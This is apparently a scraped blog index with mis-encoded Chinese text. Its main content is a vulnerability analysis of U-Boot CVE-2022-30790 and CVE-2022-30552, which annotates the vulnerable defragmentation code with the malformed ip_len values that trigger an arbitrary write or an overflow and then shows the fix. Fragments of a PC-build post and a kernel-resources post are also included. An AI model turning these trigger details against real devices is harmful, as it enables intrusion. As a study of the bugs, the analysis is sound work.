https://item.jd.com/100006880794.html ID-COLLING XF-12025-SD-K Ã—3 Â¥ 60ï¼ˆå…¨æ–°ï¼‰ https://item.jd.com/100005667115.html ç¬¬ä¸€æ¬¡èµ°çº¿ï¼Œæ‚ä¹±å¦‚éº»ğŸ¤®ã€‚\nreferenceï¼šhttps://zhuanlan.zhihu.com/p/282821640\n","date":"2022-06-16T18:42:34+08:00","image":"https://s2.loli.net/2022/06/16/EYHcq8joTrfdiBR.jpg","permalink":"https://cerr.cc/post/zkv%E7%9A%84%E6%94%92%E6%9C%BA%E7%AE%80%E5%8F%B2/","title":"ZKVçš„æ”’æœºç®€å²"},{"content":"U-Booté€Ÿè§ˆ Das U-Boot - Wikipedia https://github.com/u-boot/u-boot U-Bootæºç åœ¨çº¿æµè§ˆ æ‘ä¸­ä¼ è¨€ https://research.nccgroup.com/2022/06/03/technical-advisory-multiple-vulnerabilities-in-u-boot-cve-2022-30790-cve-2022-30552/\nğŸ¤”Hmmm\u0026hellip;æ–°é²œæ¼æ´ï¼Œæ²¡æœ‰PoCã€‚è¿™æ¬¡æ˜¯å‡ºäº†ä¸¤ä¸ªæ¼æ´ï¼Œåˆ†åˆ«æ˜¯ï¼š\nHole Descriptor Overwrite in U-Boot IP Packet Defragmentation Leads to Arbitrary Out of Bounds Write Primitive (CVE-2022-30790) Large buffer overflow leads to DoS in U-Boot IP Packet Defragmentation Code (CVE-2022-30552) å…ˆæ¥åˆ†æåˆ†æå‡ºç°æ¼æ´çš„æºç ã€‚æ ¹æ®ï¼š\nMay 18th 2022: Initial e-mail from NCC to U-boot maintainers announcing two vulnerabilities were identified.\né‚£ä¹ˆç”¨U-Boot v2022.04è·Ÿè¸ªæ¼æ´åº”è¯¥æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚\næ¼æ´æºç åˆ†æ CVE-2022-30790 æ¼æ´å½±å“ï¼š\nThe U-Boot implementation of RFC815 IP DATAGRAM REASSEMBLY ALGORITHMS is susceptible to a Hole Descriptor overwrite attack which ultimately leads to an arbitrary write primitive.\nRFC815 çœ‹æ¥éœ€è¦å…ˆäº†è§£ä¸‹RFC815çš„IPv4åˆ†ç‰‡ç®—æ³•ï¼š\nåŸæ–‡æ¡£ï¼šhttps://datatracker.ietf.org/doc/html/rfc815 ä¸€ç¯‡ç›¸å…³è®ºæ–‡ï¼šhttp://www.ecice06.com/CN/Y2008/V34/I22/100 RFC815 æ˜¯ IETF æ¨èçš„ä¸€ç§åˆ†ç‰‡é‡ç»„ç®—æ³•ï¼Œè¯¥ç®—æ³•å…·æœ‰è®°å½•åˆ†ç‰‡ç®€æ´ï¼Œå†…å­˜éœ€æ±‚é‡ä¸åŸ IPv4 æ•°æ®æŠ¥å¤§å°ä¸€è‡´ç­‰ä¼˜ç‚¹ã€‚\nè¯¥ç®—æ³•çš„ä½œç”¨å¯¹è±¡æ˜¯IPv4æ•°æ®æŠ¥ã€‚IPv4æ•°æ®æŠ¥çš„Headerç»“æ„å¦‚ä¸‹ï¼š(ref - https://en.wikipedia.org/wiki/IPv4\nå…¶ä¸­ï¼Œåˆ†ç‰‡ä¿¡æ¯è®°å½•åœ¨ï¼š\nIdentification\nThis field is an identification field and is primarily used for uniquely identifying the group of fragments of a single IP datagram. Some experimental work has suggested using the ID field for other purposes, such as for adding packet-tracing information to help trace datagrams with spoofed source addresses, but RFC 6864 now prohibits any such use. Flags\nA three-bit field follows and is used to control or identify fragments. They are (in order, from most significant to least significant):\nbit 0: Reserved; must be zero bit 1: Don\u0026rsquo;t Fragment (DF) bit 2: More Fragments (MF) If the DF flag is set, and fragmentation is required to route the packet, then the packet is dropped. This can be used when sending packets to a host that does not have resources to perform reassembly of fragments. It can also be used for path MTU discovery, either automatically by the host IP software, or manually using diagnostic tools such as ping or traceroute.\nFor unfragmented packets, the MF flag is cleared. For fragmented packets, all fragments except the last have the MF flag set. The last fragment has a non-zero Fragment Offset field, differentiating it from an unfragmented packet.\nFragment Offset\nThis field specifies the offset of a particular fragment relative to the beginning of the original unfragmented IP datagram in units of eight-byte blocks. The first fragment has an offset of zero. The 13 bit field allows a maximum offset of (213 â€“ 1) Ã— 8 = 65,528 bytes, which, with the header length included (65,528 + 20 = 65,548 bytes), supports fragmentation of packets exceeding the maximum IP length of 65,535 bytes. æ³¨æ„åˆ°åˆ†ç‰‡çš„ç´¢å¼•å•ä½ä¸º8å­—èŠ‚ã€‚\nå¥½äº†ï¼Œç®€å•äº†è§£è¿‡æ•°æ®ç»“æ„ï¼Œæ¥ç€æ¥çœ‹çœ‹ç®—æ³•ã€‚\nåŸæ–‡æ¡£æœ‰è¨€ï¼š\nOne of the mechanisms of IP is fragmentation and reassembly.\nåˆ†ç‰‡å’Œé‡ç»„æ˜¯IPv4åè®®çš„ä¸€ä¸ªæœºåˆ¶ã€‚(æ–‡æ¡£å¾ˆè€ï¼Œé‚£æ—¶è¿˜æ²¡æœ‰IPv6ã€‚In contrast, IPv6, the next generation of the Internet Protocol, does not allow routers to perform fragmentation; hosts must perform Path MTU Discovery before sending datagrams.)\nA datagram originally transmitted as a single unit will arrive at its final destination broken into several fragments.\nä¸€ä¸ªæ•°æ®æŠ¥â€”â€”ä½œä¸ºä¼ è¾“åŸºæœ¬å•å…ƒï¼Œä¼šè¢«åˆ‡åˆ†ä¸ºå¤šä¸ªåˆ†ç‰‡é€è¾¾æœ€ç»ˆçš„ç›®çš„åœ°ã€‚\nè€ŒRFC815æ‰€å®šä¹‰çš„ï¼Œæ­£æ˜¯reassemblyâ€”â€”åˆ†ç‰‡é‡ç»„è¿™ä¸€æ­¥çš„å…·ä½“å®ç°ç®—æ³•ã€‚\nIn order to define this reassembly algorithm, it is necessary to define some terms.\nA partially reassembled datagram consists of certain sequences of octets that have already arrived, and certain areas still to come.\nWe will refer to these missing areas as \u0026ldquo;holes\u0026rdquo;.\nEach hole can be characterized by two numbers:\nhole.first the number of the first octet in the hole hole.last the number of the last octet in the hole This pair of numbers we will call the \u0026ldquo;hole descriptor\u0026rdquo;,\nand we will assume that all of the hole descriptors for a particular datagram are gathered together in the \u0026ldquo;hole descriptor list\u0026rdquo;.\næ€»ä½“æ¥è¯´:\nThe general form of the algorithm is as follows.\nWhen a new fragment of the datagram arrives, it will possibly fill in one or more of the existing holes.\nWe will examine each of the entries in the hole descriptor list to see whether the hole in question is eliminated by this incoming fragment.\nIf so, we will delete that entry from the list.\nEventually, a fragment will arrive which eliminates every entry from the list.\nAt this point, the datagram has been completely reassembled and can be passed to higher protocol levels for further processing.\nå…·ä½“çš„ç®—æ³•å®ç°è¦åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š\né¦–å…ˆæ˜¯Fragment Processing Algorithm\nWe start the algorithm when the earliest fragment of the datagram arrives. We begin by creating an empty data buffer area and putting one entry in its hole descriptor list, the entry which describes the datagram as being completely missing. In this case, hole.first equals zero, and hole.last equals infinity. (Infinity is presumably implemented by a very large integer, greater than 576, of the implementor\u0026rsquo;s choice.) The following eight steps are then used to insert each of the arriving fragments into the buffer area where the complete datagram is being built up. The arriving fragment is described by fragment.first, the first octet of the fragment, and fragment.last, the last octet of the fragment.\næ¥ç€è¿›è¡Œå¦‚ä¸‹æµç¨‹ï¼š\nSelect the next hole descriptor from the hole descriptor list. If there are no more entries, go to step eight. If fragment.first is greater than hole.last, go to step one. If fragment.last is less than hole.first, go to step one. Delete the current entry from the hole descriptor list. If fragment.first is greater than hole.first, then create a new hole descriptor \u0026ldquo;new_hole\u0026rdquo; with new_hole.first equal to hole.first, and new_hole.last equal to fragment.first minus one. If fragment.last is less than hole.last and fragment.more fragments is true, then create a new hole descriptor \u0026ldquo;new_hole\u0026rdquo;, with new_hole.first equal to fragment.last plus one and new_hole.last equal to hole.last. Go to step one. If the hole descriptor list is now empty, the datagram is now complete. Pass it on to the higher level protocol processor for further handling. Otherwise, return. ç®—æ³•çš„ç¬¬äºŒéƒ¨åˆ†æ˜¯Managing the Hole Descriptor List\nå…¶ä¸­æœ‰è§„åˆ™ï¼š\nJust put each hole descriptor in the first octets of the hole itself.\nå°†holeçš„æè¿°ç¬¦ç½®äºholeçš„å‰å…«ä¸ªå­—èŠ‚ä½ç½®å³å¯ã€‚\nNote that by the definition of the reassembly algorithm, the minimum size of a hole is eight octets.\nTo store hole.first and hole.last will presumably require two octets each.\nAn additional two octets will be required to thread together the entries on the hole descriptor list.\nThis leaves at least two more octets to dealwith implementation idiosyncrasies.\nholeçš„æœ€å°å¤§å°æ˜¯8å­—èŠ‚ã€‚å¤§å°å’ŒU-Bootçš„å®ç°æ˜¯å¥‘åˆçš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 /* * this is the packet being assembled, either data or frag control. * Fragments go by 8 bytes, so this union must be 8 bytes long */ struct hole { /* first_byte is address of this structure */ u16 last_byte;\t/* last byte in this hole + 1 (begin of next hole) */ u16 next_hole;\t/* index of next (in 8-b blocks), 0 == none */ u16 prev_hole;\t/* index of prev, 0 == none */ u16 unused; }; ä½†å†…å®¹æœ‰äº›ä¸åŒï¼šU-Bootçš„å®ç°å¹¶ä¸åŒ…å«hole.firståŸŸï¼Œå› ä¸º first_byte is address of this structure.\nç”±æ­¤çœ‹æ¥ï¼Œè¿™é‡Œçš„å†…å­˜ç®¡ç†æ–¹å¼ç±»ä¼¼äºGlibcå †å†…å­˜ç®¡ç†æ–¹æ¡ˆã€‚ç”¨åŒå‘é“¾è¡¨ç®¡ç†äº†ç©ºé—²åŒºåŸŸï¼ˆholeã€free chunkï¼‰ï¼Œä¸”åœ¨ç©ºé—²åŒºåŸŸå†…éƒ¨è®°å½•è‡ªå·±çš„ç›¸å…³ä¿¡æ¯ï¼Œæœ€å°å¤§å°ä¸ºè‡ªèº«æ§åˆ¶åŸŸï¼ˆ8-Bytes struct holeã€free chunk headerï¼‰ï¼Œå¹¶ç»„æˆåŒå‘é“¾è¡¨ç”¨äºé«˜æ•ˆæ£€ç´¢ã€‚ä½†ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼Œholeä¹‹é—´ç»„æˆçš„é“¾è¡¨ï¼Œæ˜¯å€Ÿç”±å­—èŠ‚ç´¢å¼•è€ŒéæŒ‡é’ˆå®ç°çš„ã€‚\nå¼€å§‹åˆ†æ æ¼æ´ä½ç½®ï¼š\nIn u-boot/net/net.c the __net_defragment function line 900 through 1018.\næ¼æ´æºç ï¼š\nhttps://elixir.bootlin.com/u-boot/v2022.04/source/net/net.c#L900\ndefragmentå³reassemblyçš„æ“ä½œï¼Œåˆå¹¶åˆ†ç‰‡ã€‚æ³¨é‡Šä¸åˆ†æå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 static struct ip_udp_hdr *__net_defragment(struct ip_udp_hdr *ip, int *lenp) { static uchar pkt_buff[IP_PKTSIZE] __aligned(PKTALIGN); // packet_buffer ip_packet_size packet_align static u16 first_hole, total_len; struct hole *payload, *thisfrag, *h, *newh; // payload this_fragment hole new_hole struct ip_udp_hdr *localip = (struct ip_udp_hdr *)pkt_buff; uchar *indata = (uchar *)ip; int offset8, start, len, done = 0; u16 ip_off = ntohs(ip-\u0026gt;ip_off); /* payload starts after IP header, this fragment is in there */ payload = (struct hole *)(pkt_buff + IP_HDR_SIZE); offset8 = (ip_off \u0026amp; IP_OFFS); // IP_OFFS 0x1fff 0b0001111111111111ï¼Œåˆ†ç‰‡ç´¢å¼•çš„åŸºæœ¬å•ä½ä¸º8å­—èŠ‚ thisfrag = payload + offset8; // å½“å‰åˆ†ç‰‡çš„ç´¢å¼•ï¼ˆ8å­—èŠ‚ï¼‰ start = offset8 * 8; // å½“å‰åˆ†ç‰‡çš„å­—èŠ‚ç´¢å¼• len = ntohs(ip-\u0026gt;ip_len) - IP_HDR_SIZE; // æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„æ•°æ®åŒ…ï¼Œå°†ip-\u0026gt;ip_lenæ§åˆ¶åœ¨21~27ï¼Œä½¿å¾—lenä¸º1~7çš„å€¼ï¼Œè§¦å‘åç»­æ¼æ´ if (start + len \u0026gt; IP_MAXUDP) /* fragment extends too far */ return NULL; if (!total_len || localip-\u0026gt;ip_id != ip-\u0026gt;ip_id) { // group of fragments of a single IP datagramä¸åŒï¼Œæ„å‘³ç€æ–°æ¥çš„åˆ†ç‰‡ä¸å±äºåŒä¸€æ•°æ®æŠ¥ /* new (or different) packet, reset structs */ total_len = 0xffff; payload[0].last_byte = ~0; payload[0].next_hole = 0; payload[0].prev_hole = 0; first_hole = 0; /* any IP header will work, copy the first we received */ memcpy(localip, ip, IP_HDR_SIZE); } // æ­¤åå°±æ˜¯å…·ä½“çš„reassemblyç®—æ³•å®ç°äº† /* * What follows is the reassembly algorithm. We use the payload * array as a linked list of hole descriptors, as each hole starts * at a multiple of 8 bytes. However, last byte can be whatever value, * so it is represented as byte count, not as 8-byte blocks. */ h = payload + first_hole; while (h-\u0026gt;last_byte \u0026lt; start) { if (!h-\u0026gt;next_hole) { /* no hole that far away */ return NULL; } h = payload + h-\u0026gt;next_hole; } /* last fragment may be 1..7 bytes, the \u0026#34;+7\u0026#34; forces acceptance */ if (offset8 + ((len + 7) / 8) \u0026lt;= h - payload) { /* no overlap with holes (dup fragment?) */ return NULL; } if (!(ip_off \u0026amp; IP_FLAGS_MFRAG)) { /* no more fragmentss: truncate this (last) hole */ total_len = start + len; h-\u0026gt;last_byte = start + len; } /* * There is some overlap: fix the hole list. This code doesn\u0026#39;t * deal with a fragment that overlaps with two different holes * (thus being a superset of a previously-received fragment). */ if ((h \u0026gt;= thisfrag) \u0026amp;\u0026amp; (h-\u0026gt;last_byte \u0026lt;= start + len)) { /* complete overlap with hole: remove hole */ if (!h-\u0026gt;prev_hole \u0026amp;\u0026amp; !h-\u0026gt;next_hole) { /* last remaining hole */ done = 1; } else if (!h-\u0026gt;prev_hole) { /* first hole */ first_hole = h-\u0026gt;next_hole; payload[h-\u0026gt;next_hole].prev_hole = 0; } else if (!h-\u0026gt;next_hole) { /* last hole */ payload[h-\u0026gt;prev_hole].next_hole = 0; } else { /* in the middle of the list */ payload[h-\u0026gt;next_hole].prev_hole = h-\u0026gt;prev_hole; payload[h-\u0026gt;prev_hole].next_hole = h-\u0026gt;next_hole; } } else if (h-\u0026gt;last_byte \u0026lt;= start + len) { /* overlaps with final part of the hole: shorten this hole */ h-\u0026gt;last_byte = start; } else if (h \u0026gt;= thisfrag) { /* overlaps with initial part of the hole: move this hole */ newh = thisfrag + (len / 8); // è®¡ç®—new_holeçš„åˆ†ç‰‡ç´¢å¼•å€¼ã€‚lenä¸º1~7çš„å€¼æ—¶ï¼Œä¼šå¯¼è‡´æ­¤å¤„ newh == thisfrag *newh = *h; h = newh; if (h-\u0026gt;next_hole) payload[h-\u0026gt;next_hole].prev_hole = (h - payload); if (h-\u0026gt;prev_hole) payload[h-\u0026gt;prev_hole].next_hole = (h - payload); else first_hole = (h - payload); } else { /* fragment sits in the middle: split the hole */ newh = thisfrag + (len / 8); *newh = *h; h-\u0026gt;last_byte = start; h-\u0026gt;next_hole = (newh - payload); newh-\u0026gt;prev_hole = (h - payload); if (newh-\u0026gt;next_hole) payload[newh-\u0026gt;next_hole].prev_hole = (newh - payload); } /* finally copy this fragment and possibly return whole packet */ memcpy((uchar *)thisfrag, indata + IP_HDR_SIZE, len); /* è¿™é‡Œå‘this_fragmentä¸­å†™å…¥æ”»å‡»è€…å¯æ§çš„æ•°æ®ï¼Œ ä½†ç”±äº newh == thisfragï¼Œé€ æˆnew_holeä¸­çš„æ§åˆ¶æ•°æ®è¢«ç¯¡æ”¹ï¼ˆç±»ä¼¼äºfree chunk headerè¢«ç¯¡æ”¹ï¼‰ã€‚ ä¸”å½“lenä¸º6æ—¶ï¼Œfirst_holeä¸­çš„last_byteã€next_holeã€prev_holeéƒ½è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œ ç”±æ­¤ï¼Œæ”»å‡»è€…é€šè¿‡åŠ«æŒholeçš„ä½ç½®ç´¢å¼•ï¼Œé€ æˆä»»æ„åœ°å€å†™ã€‚*/ if (!done) return NULL; localip-\u0026gt;ip_len = htons(total_len); *lenp = total_len + IP_HDR_SIZE; return localip; } æ‰€ä»¥å®é™…ä¸Šæ˜¯ä¸€ä¸ªï¼šç›²ç›®ä¿¡ä»»ç”¨æˆ·ä¼ å…¥çš„IPæ•°æ®æŠ¥ä¸­çš„ip_lenå­—æ®µï¼Œé€ æˆholeç»“æ„è¢«åŠ«æŒï¼Œè€Œå¯¼è‡´çš„æ•°ç»„è¶Šç•Œå†™æ¼æ´ã€‚\nç”±æ­¤è¾¾æˆçš„ä»»æ„åœ°å€å†™å¯ä»¥ç”¨äºrootæœ¬åœ°è®¾å¤‡ã€‚ä½†ç”±äºè·¯ç”±å™¨å¾€å¾€ä¼šå¯¹ç»è¿‡è‡ªå·±çš„æ•°æ®åŒ…åˆæ³•æ€§åšæ ¡éªŒå¹¶ä¸¢å¼ƒéæ³•æ•°æ®æŠ¥ï¼Œå¯¼è‡´æ­¤æ¼æ´éš¾ä»¥äºäº’è”ç½‘ä¸Šåˆ©ç”¨ã€‚\nCVE-2022-30552 æ¼æ´å‡ºç°ä½ç½®å’Œä¸Šä¸ªæ¼æ´ç›¸åŒ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 static struct ip_udp_hdr *__net_defragment(struct ip_udp_hdr *ip, int *lenp) { static uchar pkt_buff[IP_PKTSIZE] __aligned(PKTALIGN); static u16 first_hole, total_len; struct hole *payload, *thisfrag, *h, *newh; struct ip_udp_hdr *localip = (struct ip_udp_hdr *)pkt_buff; uchar *indata = (uchar *)ip; int offset8, start, len, done = 0; u16 ip_off = ntohs(ip-\u0026gt;ip_off); /* payload starts after IP header, this fragment is in there */ payload = (struct hole *)(pkt_buff + IP_HDR_SIZE); offset8 = (ip_off \u0026amp; IP_OFFS); thisfrag = payload + offset8; start = offset8 * 8; len = ntohs(ip-\u0026gt;ip_len) - IP_HDR_SIZE; // ip-\u0026gt;ip_lenç”±æ”»å‡»è€…æ§åˆ¶ï¼Œå°†å…¶è®¾å®šä¸ºå°äºIP_HDR_SIZEçš„å€¼ä¼šä½¿å¾—lenä¸ºè´Ÿå€¼ if (start + len \u0026gt; IP_MAXUDP) /* fragment extends too far */ return NULL; if (!total_len || localip-\u0026gt;ip_id != ip-\u0026gt;ip_id) { /* new (or different) packet, reset structs */ total_len = 0xffff; payload[0].last_byte = ~0; payload[0].next_hole = 0; payload[0].prev_hole = 0; first_hole = 0; /* any IP header will work, copy the first we received */ memcpy(localip, ip, IP_HDR_SIZE); } /* * What follows is the reassembly algorithm. We use the payload * array as a linked list of hole descriptors, as each hole starts * at a multiple of 8 bytes. However, last byte can be whatever value, * so it is represented as byte count, not as 8-byte blocks. */ h = payload + first_hole; while (h-\u0026gt;last_byte \u0026lt; start) { if (!h-\u0026gt;next_hole) { /* no hole that far away */ return NULL; } h = payload + h-\u0026gt;next_hole; } /* last fragment may be 1..7 bytes, the \u0026#34;+7\u0026#34; forces acceptance */ if (offset8 + ((len + 7) / 8) \u0026lt;= h - payload) { /* no overlap with holes (dup fragment?) */ return NULL; } if (!(ip_off \u0026amp; IP_FLAGS_MFRAG)) { /* no more fragmentss: truncate this (last) hole */ total_len = start + len; h-\u0026gt;last_byte = start + len; } /* * There is some overlap: fix the hole list. This code doesn\u0026#39;t * deal with a fragment that overlaps with two different holes * (thus being a superset of a previously-received fragment). */ if ((h \u0026gt;= thisfrag) \u0026amp;\u0026amp; (h-\u0026gt;last_byte \u0026lt;= start + len)) { /* complete overlap with hole: remove hole */ if (!h-\u0026gt;prev_hole \u0026amp;\u0026amp; !h-\u0026gt;next_hole) { /* last remaining hole */ done = 1; } else if (!h-\u0026gt;prev_hole) { /* first hole */ first_hole = h-\u0026gt;next_hole; payload[h-\u0026gt;next_hole].prev_hole = 0; } else if (!h-\u0026gt;next_hole) { /* last hole */ payload[h-\u0026gt;prev_hole].next_hole = 0; } else { /* in the middle of the list */ payload[h-\u0026gt;next_hole].prev_hole = h-\u0026gt;prev_hole; payload[h-\u0026gt;prev_hole].next_hole = h-\u0026gt;next_hole; } } else if (h-\u0026gt;last_byte \u0026lt;= start + len) { /* overlaps with final part of the hole: shorten this hole */ h-\u0026gt;last_byte = start; } else if (h \u0026gt;= thisfrag) { /* overlaps with initial part of the hole: move this hole */ newh = thisfrag + (len / 8); *newh = *h; h = newh; if (h-\u0026gt;next_hole) payload[h-\u0026gt;next_hole].prev_hole = (h - payload); if (h-\u0026gt;prev_hole) payload[h-\u0026gt;prev_hole].next_hole = (h - payload); else first_hole = (h - payload); } else { /* fragment sits in the middle: split the hole */ newh = thisfrag + (len / 8); *newh = *h; h-\u0026gt;last_byte = start; h-\u0026gt;next_hole = (newh - payload); newh-\u0026gt;prev_hole = (h - payload); if (newh-\u0026gt;next_hole) payload[newh-\u0026gt;next_hole].prev_hole = (newh - payload); } /* finally copy this fragment and possibly return whole packet */ memcpy((uchar *)thisfrag, indata + IP_HDR_SIZE, len); // ç”±äºlenä¸ºè´Ÿå€¼ï¼Œæ­¤å¤„å‘ç”Ÿæ•´æ•°æº¢å‡ºï¼Œmemcpyé€ æˆæ ˆæº¢å‡º if (!done) return NULL; localip-\u0026gt;ip_len = htons(total_len); *lenp = total_len + IP_HDR_SIZE; return localip; } åŒæ ·æ˜¯å› ä¸ºç›²ä¿¡æ”»å‡»è€…çš„IPæ•°æ®æŠ¥è€Œæœªåšæ ¡éªŒï¼Œé€ æˆçš„æ•´æ•°æº¢å‡ºä¸æ ˆæº¢å‡ºæ¼æ´ã€‚\næ¼æ´å½±å“ ç”±gitä»“åº“æŸ¥çœ‹ï¼š\n1 2 3 git clone https://github.com/u-boot/u-boot.git cd u-boot git log net/net.c å¯ä»¥çœ‹åˆ°ä¿®å¤çš„commitï¼š\n1 2 3 commit b85d130ea0cac152c21ec38ac9417b31d41b5552 Author: Fabio Estevam \u0026lt;festevam@denx.de\u0026gt; Date: Thu May 26 11:14:37 2022 -0300 ç”±æ­¤æ‰¾åˆ°äº†æ¼æ´çš„æœ€æ™šå½±å“ç‰ˆæœ¬ï¼Œé‚£ä¹ˆæœ€æ—©æ˜¯ä»€ä¹ˆæ—¶å€™è¢«å¼•å…¥çš„å‘¢ï¼Ÿ\n1 git log --follow -p net/net.c ä¸€ç›´å‘å‰å›æº¯__net_defragmentçš„å†å²ï¼Œèƒ½æ‰¾åˆ°æœ€æ—©å¼•å…¥è¯¥å‡½æ•°çš„commitï¼š\n1 2 3 commit 5cfaa4e54d0eb8232fa1cf092d955fdaed5b673d Author: Alessandro Rubini \u0026lt;rubini-list@gnudd.com\u0026gt; Date: Fri Aug 7 13:58:56 2009 +0200 æ‰€ä»¥è¿™ä¸¤ä¸ªæ¼æ´å½±å“äº†2009/8/7ï½2022/5/26é—´å¼€å¯äº†CONFIG_IP_DEFRAGç¼–è¯‘é€‰é¡¹çš„U-Bootã€‚\næ¼æ´ä¿®å¤ æŸ¥çœ‹ä¿®å¤çš„patchï¼š\n1 git diff b85d130~ b85d13 å¾—åˆ°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 diff --git a/include/net.h b/include/net.h index 675bf4171b..e3889a0bc8 100644 --- a/include/net.h +++ b/include/net.h @@ -391,6 +391,8 @@ struct ip_hdr { #define IP_HDR_SIZE (sizeof(struct ip_hdr)) +#define IP_MIN_FRAG_DATAGRAM_SIZE (IP_HDR_SIZE + 8) + /* * Internet Protocol (IP) + UDP header. */ diff --git a/net/net.c b/net/net.c index 034a5d6e67..81905f6315 100644 --- a/net/net.c +++ b/net/net.c @@ -907,6 +907,9 @@ static struct ip_udp_hdr *__net_defragment(struct ip_udp_hdr *ip, int *lenp) int offset8, start, len, done = 0; u16 ip_off = ntohs(ip-\u0026gt;ip_off); + if (ip-\u0026gt;ip_len \u0026lt; IP_MIN_FRAG_DATAGRAM_SIZE) + return NULL; + /* payload starts after IP header, this fragment is in there */ payload = (struct hole *)(pkt_buff + IP_HDR_SIZE); offset8 = (ip_off \u0026amp; IP_OFFS); æ—¢ç„¶ä¸¤ä¸ªæ¼æ´éƒ½æ˜¯ç”±ç›²ä¿¡æ”»å‡»è€…IPæ•°æ®æŠ¥ä¸­çš„ip-\u0026gt;ip_lené€ æˆçš„ï¼Œé‚£ä¹ˆä¿®å¤æ–¹æ¡ˆå°±å¯¹å…¶åšä¸ªæ ¡éªŒå°±å¥½å•¦ã€‚\nä¿®å¤ä»£ç å°±æ˜¯æ·»åŠ é™åˆ¶ï¼šip-\u0026gt;ip_len \u0026gt;= IP_HDR_SIZE + 8\n","date":"2022-06-16T10:11:14+08:00","image":"https://s2.loli.net/2022/06/16/R9KWInUb6Cdyhl2.jpg","permalink":"https://cerr.cc/post/%E5%AF%B9u-boot-cve-2022-30790%E7%9A%84%E8%B7%9F%E8%B8%AA/","title":"å¯¹U-Boot CVE-2022-30790çš„è·Ÿè¸ª"},{"content":"å­¦ä¹ èµ„æ–™ æ•™ç¨‹ Linux Inside å®éªŒ Linux Kernel Lab èµ„æ–™ Linux-0.11å†…æ ¸å®Œå…¨æ³¨é‡Š å…¶ä»–äººæ±‡æ€»çš„èµ„æº Martins3å¤§ä½¬çš„æ”¶é›† å†…æ ¸è·å– å®˜æ–¹ç½‘ç«™ï¼š\nhttps://www.kernel.org/\nç›´æ¥ä¸‹è½½åˆ°çš„æ˜¯ç‰¹å®šç‰ˆæœ¬çš„å‹ç¼©åŒ…ï¼Œè€Œégitä»“åº“ã€‚ç½‘ç«™ä¹Ÿæä¾›äº†gitä»“åº“ï¼Œä½†cloneé€Ÿåº¦æ„Ÿäººã€‚\nå®˜æ–¹GitHubä»“åº“ï¼š\nhttps://github.com/torvalds/linux\næ— éœ€è§£é‡Šã€‚Linusç”¨ç€è‡ªå·±å†™çš„å¤©ä¸‹ç¬¬ä¸€ç‰ˆæœ¬ç®¡ç†å™¨å¼€å‘ç€å¤©ä¸‹ç¬¬ä¸€å¼€æºè½¯ä»¶ã€‚\nTUNAçš„Linuxé•œåƒï¼š\nhttps://mirrors.tuna.tsinghua.edu.cn/help/linux.git/\næ•™è‚²ç½‘çš„å¸¦å®½ã€THUçš„ç»è´¹ã€å¤§ä½¬ä»¬çš„ç»´æŠ¤ã€‚å›½å†…é•œåƒç«™ä¹‹ç¿˜æ¥šã€‚\nGiteeé•œåƒä»“åº“ï¼š\nhttps://gitee.com/mirrors/linux_old1\nè½åä¸»ä»“åº“ä¸€å¤©ï¼Œç”¨æ¥åŠ é€Ÿcloneçš„é€‰æ‹©ä¹‹ä¸€ã€‚\nå†…æ ¸æ–‡æ¡£ æ–‡æ¡£èµ„æºæ€»è§ˆï¼šhttps://www.kernel.org/doc/\nLatest kernelçš„HTMLæ–‡æ¡£é¡µï¼šhttps://www.kernel.org/doc/html/latest\nä½†ç”¨æµè§ˆå™¨çœ‹æ–‡æ¡£æ€»å½’æ˜¯ä¸å¦‚åœ¨ç»ˆç«¯å†…ç›´æ¥man 9 printkæ¥çš„çˆ½ã€‚ä¸ºå•¥æ˜¯man 9ï¼Ÿçœ‹çœ‹man manä¾¿çŸ¥ï¼š\n1 2 3 4 5 6 7 8 9 1 Executable programs or shell commands 2 System calls (functions provided by the kernel) 3 Library calls (functions within program libraries) 4 Special files (usually found in /dev) 5 File formats and conventions, e.g. /etc/passwd 6 Games 7 Miscellaneous (including macro packages and conventions), e.g. man(7), groff(7) 8 System administration commands (usually only for root) 9 Kernel routines [Non standard] ä½†é»˜è®¤æƒ…å†µä¸‹ä¼šï¼š\n1 2 âœ ~ man 9 printk No manual entry for printk in section 9 ç®€å•Googleåå¾—çŸ¥ï¼Œéœ€è¦apt install linux-manual-x.xè·å–x.xç‰ˆæœ¬çš„å†…æ ¸æ–‡æ¡£ï¼Œæˆ–ä½¿ç”¨apt install linux-docè·å–æœ€æ–°ç‰ˆå†…æ ¸æ–‡æ¡£ã€‚å¥½ï¼š\n1 2 3 4 5 6 7 8 9 âœ ~ apt install linux-doc Reading package lists... Done Building dependency tree Reading state information... Done The following NEW packages will be installed: linux-doc â€¦â€¦ âœ ~ man 9 printk No manual entry for printk in section 9 ï¼Ÿï¼Ÿï¼Ÿå²‚å¯ä¿®ï¼Œä¸ºä»€ä¹ˆâ€¦â€¦\nç»§ç»­Googleå¾—çŸ¥ï¼šhttps://unix.stackexchange.com/questions/666401/installing-man-pages-for-section-9-kernel-routines\nåŸæ¥è‡ª2017å¹´åï¼Œmake mandocså°±è¢«åºŸå¼ƒäº†ã€‚æƒ³è¦æ„å»ºå†…æ ¸æ–‡æ¡£ï¼Œå¦å¯»make htmldocs, make latexdocs, make pdfdocs or make epubdocsç­‰ã€‚å®Œæ•´åå•å¯äºMakefileä¸­æ‰¾åˆ°ï¼š\n1 2 3 # Documentation targets # 